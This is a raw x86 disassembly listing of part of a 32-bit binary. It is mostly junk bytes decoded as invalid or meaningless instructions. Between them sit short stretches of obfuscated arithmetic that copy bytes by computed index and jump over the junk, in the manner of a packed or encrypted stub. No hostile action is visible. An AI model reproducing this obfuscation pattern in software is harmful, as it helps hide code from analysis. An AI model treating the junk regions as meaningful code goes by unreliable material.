  40ae97:	add    DWORD PTR gs:[ebp+0x79534a8a],edi
  40ae9e:	dec    edx
  40ae9f:	cs mov ebx,0x7d721b0e
  40aea5:	pushf  
  40aea6:	daa    
  40aea7:	call   DWORD PTR [ecx-0x4a57340c]
  40aead:	sbb    bl,BYTE PTR [edx-0x16]
  40aeb0:	inc    edi
  40aeb1:	sub    ebp,DWORD PTR [esp+ebp*8-0x7e77d8a3]
  40aeb8:	xor    al,0x8c
  40aeba:	inc    ecx
  40aebb:	or     al,0xac
  40aebe:	sti    
  40aebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aec0:	sbb    eax,DWORD PTR cs:[bp+di+0x1f]
  40aec5:	(bad)  
  40aec6:	sbb    esi,DWORD PTR [ecx]
  40aec8:	adc    ebp,esp
  40aeca:	or     eax,0xf19290d1
  40aecf:	sbb    DWORD PTR [ebp-0x3dacab54],ebp
  40aed5:	std    
  40aed6:	sar    BYTE PTR [ecx],1
  40aed8:	inc    ebp
  40aed9:	lds    esp,FWORD PTR [edi]
  40aedb:	daa    
  40aedc:	pop    es
  40aedd:	fsub   QWORD PTR [ebp-0xd]
  40aee0:	stos   BYTE PTR es:[edi],al
  40aee1:	add    eax,0xde953bdf
  40aee6:	sti    
  40aee7:	xchg   DWORD PTR [eax+0x10],esi
  40aeea:	ja     0x40aec1
  40aeec:	ss jp  0x40aea7
  40aeef:	add    eax,0x473f448b
  40aef4:	or     cl,BYTE PTR [edi-0x215bd4f3]
  40aefa:	bound  edx,QWORD PTR [eax-0x65]
  40aefd:	rcr    DWORD PTR [edx-0x2f],1
  40af00:	fsub   DWORD PTR [edi+0x4a2eedda]
  40af06:	and    BYTE PTR [edi],0x4f
  40af09:	jno    0x40aee2
  40af0b:	aad    0x8c
  40af0d:	lock mov ebp,0x4a74464b
  40af13:	dec    ecx
  40af14:	shl    BYTE PTR [edi],0x2
  40af17:	or     edx,eax
  40af19:	jo     0x40af15
  40af1b:	cmp    eax,0xc90a54ad
  40af20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af21:	out    0x66,eax
  40af23:	and    edx,eax
  40af25:	adc    edx,DWORD PTR [eax+0x47d7e6f9]
  40af2b:	jl     0x40af01
  40af2d:	fxch   st(4)
  40af2f:	mov    eax,esi
  40af31:	(bad)  
  40af32:	les    esi,FWORD PTR [ebx+0x56]
  40af35:	push   ss
  40af36:	arpl   WORD PTR [edi],dx
  40af38:	ret    
  40af39:	xchg   edx,eax
  40af3a:	lods   al,BYTE PTR ds:[esi]
  40af3b:	cwde   
  40af3c:	jns    0x40af4a
  40af3e:	dec    esp
  40af3f:	call   0xc35b:0xcfd80851
  40af46:	jmp    0x87041e59
  40af4b:	mov    ecx,0xad44a002
  40af50:	sbb    BYTE PTR [ebp+0x7c],bl
  40af53:	ins    BYTE PTR es:[edi],dx
  40af54:	push   edi
  40af55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af56:	stos   BYTE PTR es:[edi],al
  40af57:	or     ecx,DWORD PTR [esi-0x7a]
  40af5a:	into   
  40af5b:	(bad)  
  40af5c:	aad    0xec
  40af5e:	je     0x40af1a
  40af60:	push   ebx
  40af61:	int3   
  40af62:	mov    ds:0x2a7702e,al
  40af67:	jbe    0x40af89
  40af69:	lods   al,BYTE PTR ds:[esi]
  40af6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af6b:	mov    eax,ds:0x50fc968d
  40af70:	(bad)  
  40af71:	repz repz pop es
  40af74:	dec    esp
  40af75:	lahf   
  40af76:	xchg   BYTE PTR [esi],ah
  40af78:	mov    eax,ds:0xf74f2d4c
  40af7d:	inc    ecx
  40af7e:	cmp    BYTE PTR [edi],bh
  40af80:	add    al,0xf7
  40af82:	fild   QWORD PTR [ebp+0x4c5e924]
  40af88:	rcl    DWORD PTR ds:0x9deb3ccc,cl
  40af8e:	fcmovnu st,st(0)
  40af90:	or     eax,ecx
  40af92:	enter  0x3741,0xff
  40af96:	mov    ebp,ecx
  40af98:	icebp  
  40af99:	mov    ds:0x7f369374,al
  40af9e:	lea    edi,[esi-0x2b]
  40afa1:	into   
  40afa2:	mov    ds:0xb10f7118,eax
  40afa7:	dec    edx
  40afa8:	adc    DWORD PTR [edi+eiz*1-0x2d7b7cd5],eax
  40afaf:	add    esp,DWORD PTR [ebx-0x17c3a17f]
  40afb5:	adc    DWORD PTR [edi-0x1f80456],ebp
  40afbb:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40afbd:	push   ebx
  40afbe:	mov    eax,ds:0x9e11092
  40afc3:	aaa    
  40afc4:	or     cl,0x7b
  40afc7:	and    esp,DWORD PTR [ecx+0x3229254f]
  40afcd:	dec    eax
  40afce:	lods   al,BYTE PTR ds:[esi]
  40afcf:	mov    esi,DWORD PTR ds:0xc212dbe4
  40afd5:	mov    WORD PTR [edi+esi*1],gs
  40afd8:	mov    BYTE PTR [eax+eiz*8-0x497d67c3],al
  40afdf:	aaa    
  40afe0:	inc    esi
  40afe1:	lods   al,BYTE PTR ds:[esi]
  40afe2:	cmp    BYTE PTR [ebp+edi*1+0xfe05d8b],0xaf
  40afea:	ror    DWORD PTR [ebx-0x2ccc1ba3],cl
  40aff0:	sub    edx,0x26bd
  40aff6:	add    eax,ecx
  40aff8:	and    edx,0x7126
  40affe:	mov    ebx,ecx
  40b000:	sub    ebx,edx
  40b002:	mov    edx,DWORD PTR [ebp-0x18]
  40b005:	sub    eax,edx
  40b007:	mov    edx,DWORD PTR [ebp-0x14]
  40b00a:	sub    eax,edx
  40b00c:	mov    edx,DWORD PTR [ebp+0xc]
  40b00f:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40b016:	mov    BYTE PTR [eax-0xbb5],dl
  40b01c:	mov    eax,DWORD PTR [ebp-0x10]
  40b01f:	xor    eax,0xffffe1ce
  40b024:	add    eax,DWORD PTR [ebp-0xc]
  40b027:	xor    edx,edx
  40b029:	and    eax,0x6d33
  40b02e:	lea    ecx,[ecx+eax*1-0x6520]
  40b035:	mov    eax,DWORD PTR [ebp+0x8]
  40b038:	mov    ebx,DWORD PTR [ebp-0x4]
  40b03b:	add    eax,edi
  40b03d:	div    ebx
  40b03f:	mov    edx,DWORD PTR [ebp-0x8]
  40b042:	mov    ebx,0x940a7
  40b047:	sub    eax,edx
  40b049:	xor    edx,edx
  40b04b:	div    ebx
  40b04d:	add    eax,esi
  40b04f:	cmp    ecx,eax
  40b051:	jb     0x40aa71
  40b057:	xor    ebx,ebx
  40b059:	inc    ebx
  40b05a:	mov    DWORD PTR [ebp+0xc],0x77bd
  40b061:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40b068:	mov    DWORD PTR [ebp-0x8],0x4738
  40b06f:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40b076:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40b07d:	mov    DWORD PTR [ebp-0x14],0x64ec
  40b084:	mov    DWORD PTR [ebp-0x18],0x1984
  40b08b:	mov    DWORD PTR [ebp-0x1c],0x293
  40b092:	mov    eax,DWORD PTR [ebp+0x8]
  40b095:	mov    ecx,DWORD PTR [ebp+0xc]
  40b098:	add    eax,0x1ef2
  40b09d:	and    eax,ecx
  40b09f:	xor    eax,0x7240
  40b0a4:	mov    ecx,0x7aaa
  40b0a9:	sub    ecx,eax
  40b0ab:	mov    DWORD PTR [ebp+0xc],0x8d3
  40b0b2:	mov    DWORD PTR [ebp+0x8],0x2392
  40b0b9:	mov    DWORD PTR [ebp-0x20],ebx
  40b0bc:	mov    DWORD PTR [ebp-0x24],0x338f
  40b0c3:	mov    DWORD PTR [ebp-0x28],0x61c9
  40b0ca:	mov    eax,DWORD PTR [ebp+0x8]
  40b0cd:	mov    edx,DWORD PTR [ebp+0xc]
  40b0d0:	imul   eax,edx
  40b0d3:	xor    eax,0x40a0
  40b0d8:	or     eax,0x1a48
  40b0dd:	xor    eax,0x139ddb0
  40b0e2:	mov    esi,ecx
  40b0e4:	jmp    0x40b37b
  40b0e9:	stos   BYTE PTR es:[edi],al
  40b0ea:	(bad)  
  40b0eb:	mov    ss,WORD PTR [esi-0x355674c]
  40b0f1:	sub    BYTE PTR [edx],dh
  40b0f3:	inc    eax
  40b0f4:	(bad)  
  40b0f6:	pop    eax
  40b0f7:	dec    esp
  40b0f8:	xchg   edx,eax
  40b0f9:	ret    0xbeaf
  40b0fc:	mov    esi,0xbebec2a9
  40b101:	pusha  
  40b102:	adc    bh,ch
  40b104:	ficom  DWORD PTR [edi+0x62]
  40b107:	jp     0x40b0ee
  40b109:	mov    al,ds:0x8d4b3d20
  40b10e:	jns    0x40b184
  40b110:	cli    
  40b111:	je     0x40b0c8
  40b113:	cmp    esi,DWORD PTR [edx+esi*1-0x6062a09e]
  40b11a:	clc    
  40b11b:	pushf  
  40b11c:	je     0x40b150
  40b11e:	pop    edx
  40b11f:	fbstp  TBYTE PTR [eax-0xd39ffaf]
  40b125:	sub    BYTE PTR [edi+0x60371094],ah
  40b12b:	xchg   edi,eax
  40b12c:	or     DWORD PTR [esp+eax*8],esi
  40b12f:	imul   edx,DWORD PTR [ebp+0x1632b1b4],0xfffffffd
  40b136:	into   
  40b137:	idiv   dh
  40b139:	mov    dl,0x24
  40b13b:	xchg   ebx,eax
  40b13c:	pop    edx
  40b13d:	retf   
  40b13e:	add    DWORD PTR [edi-0x3e6bafa8],edi
  40b144:	out    dx,eax
  40b145:	(bad)  [edx-0x2d0b37be]
  40b14b:	add    eax,0xfbaf5db2
  40b150:	inc    esi
  40b151:	(bad)  
  40b152:	ss pop edx
  40b154:	or     al,ch
  40b156:	rol    BYTE PTR [ecx],cl
  40b158:	adc    al,0x9c
  40b15a:	dec    esi
  40b15b:	(bad)  
  40b15c:	mov    ah,0x63
  40b15e:	pushf  
  40b15f:	push   eax
  40b160:	int    0x77
  40b162:	(bad)  
  40b163:	loopne 0x40b158
  40b165:	aad    0x91
  40b167:	pop    edx
  40b168:	sub    ah,al
  40b16a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b16b:	test   eax,0x68be17a0
  40b170:	sbb    DWORD PTR [eax+0x66a0cfc0],ebp
  40b176:	rol    edx,0x8
  40b179:	cmp    cl,bl
  40b17b:	adc    ecx,edi
  40b17d:	push   es
  40b17e:	sbb    DWORD PTR [ebp+0x24],esi
  40b181:	shl    bl,1
  40b183:	xor    al,bh
  40b185:	cmp    eax,0xa9be57dd
  40b18a:	fsub   QWORD PTR [ebx+0x1bd72e34]
  40b190:	push   edx
  40b191:	lahf   
  40b192:	nop
  40b193:	test   BYTE PTR [ecx],ch
  40b195:	idiv   BYTE PTR [edx]
  40b197:	aas    
  40b198:	stos   BYTE PTR es:[edi],al
  40b199:	scas   eax,DWORD PTR es:[edi]
  40b19a:	lods   al,BYTE PTR ds:[esi]
  40b19b:	sbb    ebx,esi
  40b19d:	add    DWORD PTR ds:0x75c8a95a,0xffffff99
  40b1a4:	hlt    
  40b1a5:	lods   al,BYTE PTR ds:[esi]
  40b1a6:	push   eax
  40b1a7:	loopne 0x40b205
  40b1a9:	or     edx,ebp
  40b1ab:	xchg   ecx,eax
  40b1ac:	das    
  40b1ad:	mov    ds:0x72ef4e9d,eax
  40b1b2:	jge    0x40b21f
  40b1b4:	out    0xbc,eax
  40b1b6:	retf   0x9fe0
  40b1b9:	push   ecx
  40b1ba:	je     0x40b210
  40b1bc:	inc    ebp
  40b1bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1be:	(bad)  
  40b1bf:	fsubr  QWORD PTR [edx-0x26aa0a2d]
  40b1c5:	out    dx,al
  40b1c6:	mov    ds:0x5ed2c046,al
  40b1cb:	dec    edi
  40b1cc:	xchg   esi,eax
  40b1cd:	add    al,BYTE PTR [edx+0x2893f6d9]
  40b1d3:	scas   eax,DWORD PTR es:[edi]
  40b1d4:	jg     0x40b219
  40b1d6:	xor    eax,0x183c4f0d
  40b1db:	xchg   DWORD PTR [ebx],esi
  40b1dd:	lods   eax,DWORD PTR ds:[esi]
  40b1de:	mov    WORD PTR [ecx-0x4c],?
  40b1e1:	fdiv   st(2),st
  40b1e3:	push   ebx
  40b1e4:	scas   eax,DWORD PTR es:[edi]
  40b1e5:	push   cs
  40b1e6:	fnstsw WORD PTR [ecx+0x633f8234]
  40b1ec:	scas   eax,DWORD PTR es:[edi]
  40b1ed:	pop    ebp
  40b1ee:	push   0x818af425
  40b1f3:	(bad)  
  40b1f4:	mov    ecx,0xe1675945
  40b1f9:	retf   
  40b1fa:	sbb    BYTE PTR ds:0xa5399966,ch
  40b200:	jb     0x40b1ad
  40b202:	and    bl,BYTE PTR [edx]
  40b204:	stos   DWORD PTR es:[edi],eax
  40b205:	aaa    
  40b206:	(bad)  
  40b207:	adc    DWORD PTR [eax+edi*4+0x58],ebp
  40b20b:	stc    
  40b20c:	adc    ebp,esi
  40b20e:	sub    al,dh
  40b210:	retf   
  40b211:	push   edx
  40b212:	test   DWORD PTR [ecx],ebp
  40b214:	or     dl,BYTE PTR [ecx+0x106c3eab]
  40b21a:	ror    ebp,cl
  40b21c:	or     esi,DWORD PTR [edi+ecx*1-0x5743bcb4]
  40b223:	das    
  40b224:	ucomiss xmm4,DWORD PTR [ebx-0x6bed8710]
  40b22b:	aas    
  40b22c:	aad    0xef
  40b22e:	mov    edx,0x9f7fba14
  40b233:	loope  0x40b1da
  40b235:	push   ecx
  40b236:	sbb    si,ax
  40b239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b23a:	push   ebp
  40b23b:	jg     0x40b23b
  40b23d:	cli    
  40b23e:	imul   DWORD PTR [ecx]
  40b240:	fst    QWORD PTR [edx+0x1217c712]
  40b246:	mov    eax,0x4ac2c3cb
  40b24b:	xchg   ecx,eax
  40b24c:	sbb    dh,0x81
  40b24f:	mov    bh,0x53
  40b251:	jge    0x40b1d8
  40b253:	leave  
  40b254:	aaa    
  40b255:	dec    ecx
  40b256:	jl     0x40b24c
  40b258:	sub    DWORD PTR [eax+0x2c952ea1],esi
  40b25e:	adc    eax,0x7f7aaa16
  40b263:	aam    0x93
  40b265:	imul   eax,DWORD PTR [ecx-0x55],0x8
  40b269:	adc    dh,BYTE PTR [esi-0x748425e5]
  40b26f:	sti    
  40b270:	and    al,0xae
  40b272:	push   ebp
  40b273:	or     eax,0xf5b8a352
  40b278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b279:	jbe    0x40b242
  40b27b:	pop    edx
  40b27c:	add    ebp,DWORD PTR [edx-0x2bfabd38]
  40b282:	cmp    al,0xe8
  40b284:	mov    cl,BYTE PTR cs:[ecx+0x1c]
  40b288:	(bad)  
  40b289:	shl    dh,0xb7
  40b28c:	push   eax
  40b28d:	or     bl,BYTE PTR [ebx+ecx*2-0x64fca943]
  40b294:	iret   
  40b295:	sub    bh,BYTE PTR [edx]
  40b297:	xchg   edi,eax
  40b298:	and    DWORD PTR [esi-0x62],esi
  40b29b:	jmp    0x40b263
  40b29d:	rcr    BYTE PTR [eax-0x2f],cl
  40b2a0:	js     0x40b29f
  40b2a2:	cmc    
  40b2a3:	shr    ah,cl
  40b2a5:	xchg   ecx,eax
  40b2a6:	push   cs
  40b2a7:	das    
  40b2a8:	cdq    
  40b2a9:	sahf   
  40b2aa:	in     eax,dx
  40b2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2ac:	push   ebp
  40b2ad:	scas   al,BYTE PTR es:[edi]
  40b2ae:	hlt    
  40b2af:	push   esp
  40b2b0:	das    
  40b2b1:	push   ds
  40b2b2:	mov    DWORD PTR [ebx-0x4020849],edi
  40b2b8:	sbb    eax,0xec835355
  40b2bd:	lods   al,BYTE PTR ds:[esi]
  40b2be:	fwait
  40b2bf:	aad    0xa6
  40b2c1:	xchg   ecx,eax
  40b2c2:	jmp    0x476e:0xf093d75e
  40b2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2ca:	push   esp
  40b2cb:	stos   BYTE PTR es:[edi],al
  40b2cc:	sub    al,0x4f
  40b2ce:	out    dx,al
  40b2cf:	lods   eax,DWORD PTR ds:[esi]
  40b2d0:	cld    
  40b2d1:	adc    BYTE PTR ds:0x633bc5b1,al
  40b2d7:	inc    esp
  40b2d8:	mov    ?,WORD PTR ds:0x4c6cf965
  40b2de:	fdivr  DWORD PTR [edi+0x15]
  40b2e1:	xor    al,0x26
  40b2e3:	add    eax,0x910a7109
  40b2e8:	jmp    0xa943e702
  40b2ed:	xchg   esp,eax
  40b2ee:	sti    
  40b2ef:	inc    esi
  40b2f0:	mov    ah,0x64
  40b2f2:	or     al,0xcb
  40b2f4:	push   ss
  40b2f5:	stc    
  40b2f6:	xchg   ebx,eax
  40b2f7:	dec    ebp
  40b2f8:	inc    edx
  40b2f9:	inc    si
  40b2fb:	dec    ecx
  40b2fc:	pop    esi
  40b2fd:	adc    DWORD PTR [ebx+edx*4+0x76063ed0],edi
  40b304:	addr16 or al,bh
  40b307:	data16 stos BYTE PTR es:[edi],al
  40b309:	or     ebp,DWORD PTR [edx]
  40b30b:	ret    
  40b30c:	mov    ds:0x6731eab9,al
  40b311:	push   eax
  40b312:	adc    eax,0x7b0882eb
  40b317:	xchg   edi,eax
  40b318:	aad    0x3f
  40b31a:	aaa    
  40b31b:	enter  0xe436,0x14
  40b31f:	aas    
  40b320:	inc    dh
  40b322:	scas   al,BYTE PTR es:[edi]
  40b323:	mov    BYTE PTR [ecx],bl
  40b325:	pop    edi
  40b326:	mov    ch,0xc9
  40b328:	adc    edx,esp
  40b32a:	jge    0x40b351
  40b32c:	scas   eax,DWORD PTR es:[edi]
  40b32d:	pop    edi
  40b32e:	cmp    ecx,DWORD PTR [eax+0x5509ccf1]
  40b334:	mov    cl,0xaf
  40b336:	(bad)  
  40b337:	fist   WORD PTR [eax+0x20a7016c]
  40b33d:	dec    edi
  40b33e:	mov    esp,0x5c1b847f
  40b343:	cmp    ah,0xd2
  40b346:	xor    al,0x48
  40b348:	out    0x14,eax
  40b34a:	pop    ds
  40b34b:	xor    DWORD PTR [edi],edi
  40b34d:	scas   eax,DWORD PTR es:[edi]
  40b34e:	(bad)  
  40b34f:	aam    0x2c
  40b351:	mov    bh,0xfe
  40b353:	sub    eax,0xea097bdf
  40b358:	scas   al,BYTE PTR es:[edi]
  40b359:	dec    ebx
  40b35a:	xlat   BYTE PTR ds:[ebx]
  40b35b:	sbb    al,0xcd
  40b35d:	fmul   DWORD PTR [eiz*1+0x46f8862b]
  40b364:	jne    0x40b365
  40b366:	push   cs
  40b367:	call   0x8472:0xf0959b3b
  40b36e:	fstp   QWORD PTR [ecx+esi*8-0x20824b4d]
  40b375:	cmp    al,0xdf
  40b377:	add    edx,DWORD PTR [edi-0xfd430f8]
  40b37d:	mov    eax,DWORD PTR [ebp-0x28]
  40b380:	mov    edx,DWORD PTR [ebp-0x24]
  40b383:	mov    edi,DWORD PTR [ebp-0x20]
  40b386:	or     eax,0x1cc2
  40b38b:	sub    eax,edx
  40b38d:	xor    edx,edx
  40b38f:	div    edi
  40b391:	mov    edx,DWORD PTR ds:0x4226f8
  40b397:	mov    edx,DWORD PTR [edx+0x1d4]
  40b39d:	sub    edx,eax
  40b39f:	mov    eax,DWORD PTR [ebp+0x10]
  40b3a2:	mov    al,BYTE PTR [esi+eax*1]
  40b3a5:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40b3ac:	mov    eax,DWORD PTR [ebp-0x1c]
  40b3af:	mov    edx,DWORD PTR [ebp-0x18]
  40b3b2:	imul   eax,edx
  40b3b5:	mov    edx,DWORD PTR [ebp-0x14]
  40b3b8:	imul   eax,eax,0x262b
  40b3be:	or     eax,edx
  40b3c0:	jmp    0x40b657
  40b3c5:	dec    ecx
  40b3c6:	mov    bl,0x7d
  40b3c8:	push   esp
  40b3c9:	mov    bh,0x74
  40b3cb:	pushf  
  40b3cc:	mov    esp,0xe3db5995
  40b3d1:	mov    ebx,0xade3eb9d
  40b3d6:	mov    bl,0xbe
  40b3d8:	mov    esi,0xbebec2a9
  40b3dd:	pop    ebp
  40b3de:	jns    0x40b453
  40b3e0:	xchg   esp,eax
  40b3e1:	mov    eax,ds:0x508bc7c3
  40b3e6:	push   edx
  40b3e7:	and    BYTE PTR [edx+0xe],al
  40b3ea:	call   0x64e6:0xf873a965
  40b3f1:	test   BYTE PTR [ebx+0x5c],bh
  40b3f4:	sbb    DWORD PTR [edx-0x14],0xffffffa1
  40b3f8:	ja     0x40b450
  40b3fa:	sahf   
  40b3fb:	popa   
  40b3fc:	xchg   si,ax
  40b3fe:	loopne 0x40b3be
  40b400:	and    al,0xd1
  40b403:	in     al,0xfa
  40b405:	jne    0x40b3a2
  40b407:	mov    ch,0xb5
  40b409:	pop    ss
  40b40a:	(bad)  
  40b40b:	mov    edi,0x951768b7
  40b410:	sub    BYTE PTR [edi],0x15
  40b413:	mov    edi,0x21b9fe4c
  40b418:	addr16 jle 0x40b3db
  40b41b:	retf   0x3b67
  40b41e:	lods   al,BYTE PTR ds:[esi]
  40b41f:	add    al,0x8
  40b421:	jg     0x40b44c
  40b423:	xor    BYTE PTR [esi-0x1344d901],dh
  40b429:	aam    0xb
  40b42b:	lahf   
  40b42c:	xor    dl,ah
  40b42e:	fsubr  DWORD PTR [edi+0x37]
  40b431:	mov    dl,0xc3
  40b433:	lods   eax,DWORD PTR ds:[esi]
  40b434:	stos   DWORD PTR es:[edi],eax
  40b435:	push   0x10601c28
  40b43a:	rol    DWORD PTR [eax-0x72],0xd8
  40b43e:	test   al,0x1d
  40b440:	jge    0x40b43b
  40b442:	popf   
  40b443:	pop    esp
  40b444:	cmp    ecx,DWORD PTR [edx+0x1b]
  40b447:	and    dl,dh
  40b449:	mov    edi,0x9da0c177
  40b44e:	jle    0x40b40d
  40b450:	out    0x19,eax
  40b452:	es stos DWORD PTR es:[edi],eax
  40b454:	retf   
  40b455:	inc    ebx
  40b456:	push   esp
  40b457:	out    0xe5,al
  40b459:	daa    
  40b45a:	mov    ebp,0xa19cdf1e
  40b45f:	adc    eax,0x709940a4
  40b464:	daa    
  40b465:	repnz leave 
  40b467:	shl    BYTE PTR [edi],1
  40b469:	cli    
  40b46a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b46b:	mov    bh,0x21
  40b46d:	pop    ds
  40b46e:	loop   0x40b46c
  40b470:	mov    bh,0xdf
  40b472:	neg    BYTE PTR [ebp-0x2a]
  40b475:	sub    DWORD PTR [edx+0x3],eax
  40b478:	fiadd  WORD PTR [edx+0x6a]
  40b47b:	call   0x5ebf25bd
  40b480:	loop   0x40b44b
  40b482:	mov    ds:0x129127ff,eax
  40b487:	lea    edx,[edi+ebx*1]
  40b48a:	nop
  40b48b:	dec    esi
  40b48c:	sbb    BYTE PTR [esi-0x43ce05ba],al
  40b492:	das    
  40b493:	mov    DWORD PTR [ebx],edx
  40b495:	test   eax,0x51882944
  40b49a:	push   cs
  40b49b:	lds    edi,FWORD PTR [edx-0x4f]
  40b49e:	aad    0xa
  40b4a0:	mul    BYTE PTR [edi+0x67b85a21]
  40b4a6:	push   esi
  40b4a7:	mov    eax,ds:0xd7911008
  40b4ac:	iret   
  40b4ad:	adc    BYTE PTR [eax],0x49
  40b4b0:	int3   
  40b4b1:	(bad)  
  40b4b2:	mov    esp,0x925fc5ca
  40b4b7:	mov    bh,0xa5
  40b4b9:	test   bh,bh
  40b4bb:	sbb    eax,0xb6f14a0a
  40b4c0:	inc    ecx
  40b4c1:	arpl   WORD PTR [esi+edi*8],si
  40b4c4:	in     al,dx
  40b4c5:	cmp    eax,0x16ebbd2
  40b4ca:	and    DWORD PTR [esi-0x49fb0472],ecx
  40b4d0:	mov    ebx,DWORD PTR [edi]
  40b4d2:	mov    eax,ds:0xd3c05635
  40b4d7:	fisubr WORD PTR [edi+0x6df66925]
  40b4dd:	xchg   edx,eax
  40b4de:	jns    0x40b47c
  40b4e0:	cmp    edx,DWORD PTR [esi]
  40b4e2:	and    eax,0x969e4a2b
  40b4e7:	aaa    
  40b4e8:	sub    DWORD PTR [edi-0x4030be8d],0x40799d
  40b4f2:	push   ecx
  40b4f3:	in     al,dx
  40b4f4:	jns    0x40b554
  40b4f6:	add    edi,ecx
  40b4f8:	iret   
  40b4f9:	push   ebx
  40b4fa:	mov    edx,0x594cc8ef
  40b4ff:	sub    cl,bh
  40b501:	std    
  40b502:	pop    ds
  40b503:	add    ecx,DWORD PTR [eax+0x473894b1]
  40b509:	push   cs
  40b50a:	mov    ah,0xce
  40b50c:	inc    edi
  40b50d:	pop    es
  40b50e:	xchg   edi,eax
  40b50f:	mov    bl,0xc1
  40b511:	icebp  
  40b512:	dec    ebp
  40b513:	xlat   BYTE PTR ds:[ebx]
  40b514:	aas    
  40b515:	add    DWORD PTR [ebp+0x6a],0xffffffd7
  40b519:	(bad)  
  40b51a:	jl     0x40b599
  40b51c:	xor    DWORD PTR [ebp-0x73],ebx
  40b51f:	push   edi
  40b520:	mov    ds:0xfb980de,al
  40b525:	mov    DWORD PTR ds:0x756b5570,edx
  40b52b:	in     al,dx
  40b52c:	mul    DWORD PTR [eax]
  40b52e:	sti    
  40b52f:	jmp    0x40b582
  40b531:	pop    ss
  40b532:	pop    es
  40b533:	jbe    0x40b53e
  40b535:	push   ebx
  40b536:	mov    cl,0x5d
  40b538:	mov    dh,0x6
  40b53a:	sti    
  40b53b:	aad    0x7
  40b53d:	imul   edi,DWORD PTR [eax+0x49],0xa8c50d4f
  40b544:	fidivr WORD PTR [ebx]
  40b546:	(bad)  
  40b547:	mov    ds:0xae9e65bd,al
  40b54c:	add    BYTE PTR [eax-0x703c4d77],cl
  40b552:	dec    ebx
  40b553:	jo     0x40b4f8
  40b555:	pop    esp
  40b556:	stc    
  40b557:	adc    BYTE PTR [edi+0x68c20d6d],bl
  40b55d:	mov    esp,0x4bfacaf4
  40b562:	jo     0x40b5c2
  40b564:	xor    eax,0xbeeae6fc
  40b569:	popa   
  40b56a:	inc    ecx
  40b56b:	call   0x1ed2:0x165fa5a9
  40b572:	jmp    0x45c:0x8b831c01
  40b579:	xor    bh,BYTE PTR [ecx]
  40b57b:	add    DWORD PTR [esi+0x3a],esi
  40b57e:	pop    ebx
  40b57f:	and    eax,0x5a36465e
  40b584:	loop   0x40b592
  40b586:	cmp    ebp,ebx
  40b588:	out    dx,eax
  40b589:	das    
  40b58a:	and    al,0xff
  40b58c:	dec    ebp
  40b58d:	sub    al,0x1d
  40b58f:	mov    ebp,0x8808da40
  40b594:	jne    0x40b558
  40b596:	retf   
  40b597:	ins    DWORD PTR es:[edi],dx
  40b598:	xor    DWORD PTR [edx+eiz*4],edx
  40b59b:	frstor [edx+ebp*2+0x23]
  40b59f:	mov    eax,0x59920616
  40b5a4:	push   ecx
  40b5a5:	rcr    BYTE PTR [ebp+0x48dc9907],cl
  40b5ab:	push   edi
  40b5ac:	(bad)  
  40b5ad:	lock (bad) 
  40b5af:	bnd jbe 0x40b618
  40b5b2:	sbb    ch,BYTE PTR [edi+eax*4]
  40b5b5:	push   edi
  40b5b6:	inc    edi
  40b5b7:	test   DWORD PTR [edi],edx
  40b5b9:	not    DWORD PTR [ecx]
  40b5bb:	pop    ebx
  40b5bc:	xchg   edx,eax
  40b5bd:	xlat   BYTE PTR ds:[ebx]
  40b5be:	jmp    0xd7cc495
  40b5c3:	mov    esp,0x624d363e
  40b5c8:	mov    cl,0x1d
  40b5ca:	pushf  
  40b5cb:	out    dx,al
  40b5cc:	push   edx
  40b5cd:	xchg   edi,eax
  40b5ce:	xchg   ebp,eax
  40b5cf:	inc    edi
  40b5d0:	js     0x40b5d4
  40b5d2:	inc    edi
  40b5d3:	out    0xd1,eax
  40b5d5:	rcl    cl,cl
  40b5d7:	cmp    BYTE PTR [eax+0x4a16762c],al
  40b5dd:	popf   
  40b5de:	push   esp
  40b5df:	mov    eax,DWORD PTR [ecx-0x4243a23]
  40b5e5:	pop    esi
  40b5e6:	push   esi
  40b5e7:	dec    esi
  40b5e8:	cmc    
  40b5e9:	cmp    esp,DWORD PTR [edi]
  40b5eb:	(bad)  
  40b5ec:	fidivr WORD PTR [ebx]
  40b5ee:	jg     0x40b61e
  40b5f0:	add    ecx,DWORD PTR [ecx]
  40b5f2:	aam    0xcd
  40b5f4:	sti    
  40b5f5:	lea    ebp,[esi]
  40b5f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f8:	fmul   DWORD PTR [esi+ebp*2+0x24]
  40b5fc:	test   DWORD PTR gs:[esp+esi*8],0x121e47d2
  40b604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b605:	mov    dl,al
  40b607:	or     ebx,edi
  40b609:	in     eax,0xab
  40b60b:	retf   0x3328
  40b60e:	mov    bh,0x2b
  40b610:	add    ebx,DWORD PTR [edi]
  40b612:	and    eax,DWORD PTR [edi-0x39]
  40b615:	ret    0x103f
  40b618:	fidivr WORD PTR [esi]
  40b61a:	cli    
  40b61b:	loopne 0x40b689
  40b61d:	inc    ebx
  40b61e:	jo     0x40b5c4
  40b620:	dec    ebx
  40b621:	adc    eax,0x125526b3
  40b626:	mul    BYTE PTR [eax-0xb]
  40b629:	sub    bh,BYTE PTR [esi]
  40b62b:	inc    sp
  40b62d:	das    
  40b62e:	or     edi,DWORD PTR [edi+0xc3f7e5e]
  40b634:	out    dx,al
  40b635:	mov    dl,0xf5
  40b637:	and    eax,0x1c1242f1
  40b63c:	data16 fs jb 0x40b65c
  40b640:	dec    ebx
  40b641:	and    ah,BYTE PTR [esi+ebp*1-0x66]
  40b645:	cmp    ebp,ebp
  40b647:	push   esp
